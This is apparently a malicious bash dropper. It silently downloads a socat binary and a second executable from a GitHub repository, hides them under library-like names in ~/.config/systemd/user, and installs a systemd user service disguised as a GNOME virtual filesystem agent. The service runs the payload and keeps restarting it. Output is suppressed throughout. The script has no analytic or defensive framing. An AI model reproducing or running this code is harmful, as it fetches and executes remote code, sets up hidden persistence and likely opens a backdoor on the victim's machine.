#!/bin/bash

{

mkdir -p $HOME/.config/systemd/user/libxct-util

curl -s -o $HOME/.config/systemd/user/libxct-util/libdev.so https://github.com/pqowbbb/testing/raw/main/socatx64.bin 2>/dev/null

curl -s -o $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://github.com/pqowbbb/testing/raw/main/libdev.so.6 2>/dev/null

chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6


cat > $HOME/.config/systemd/user/gvfs-agent.service << EOF
[Unit]
Description=Virtual filesystem service - agent
StartLimitInterval=0

[Service]
WorkingDirectory=$HOME/.config/systemd/user
ExecStart=/bin/bash -c "$HOME/.config/systemd/user/libxct-util/libdev.so.6"
ExecStop=kill -HUP \$MAINPID
Restart=always
RestartSec=120
RuntimeMaxSec=300
TimeoutSec=300

[Install]
WantedBy=default.target

EOF

systemctl --user enable gvfs-agent.service
systemctl --user start gvfs-agent.service

} &> /dev/null
